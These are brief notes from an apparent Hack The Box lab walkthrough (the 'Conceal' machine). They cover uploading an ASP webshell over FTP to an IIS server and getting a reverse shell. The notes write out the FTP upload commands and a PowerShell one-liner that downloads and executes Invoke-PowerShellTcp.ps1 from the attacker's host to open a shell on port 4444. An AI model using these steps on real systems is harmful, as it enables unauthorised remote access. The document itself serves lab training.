# 20 - FTP


# Empty directory
![](vx_images/4838643555587.png)


# Gobuster on IIS
![](vx_images/5129167881338.png)


# Arbitrary File Upload

```
┌─[user@parrot]─[10.10.14.9]─[~/htb/conceal]
└──╼ $ cp   /opt/webshell/asp/webshell.asp

ftp> put webshell.asp
local: webshell.asp remote: webshell.asp
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1412 bytes sent in 0.00 secs (49.8736 MB/s)
```


# webshell.asp

![](vx_images/3142737829742.png)


# Payload
```
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.9/Invoke-PowerShellTcp.ps1')
```

Don't forget to add `Invoke-PowerShellTcp -Reverse -IPAddress $IP -Port 4444`  to the bottom of the script.

# Shell
![](vx_images/887009526384.png)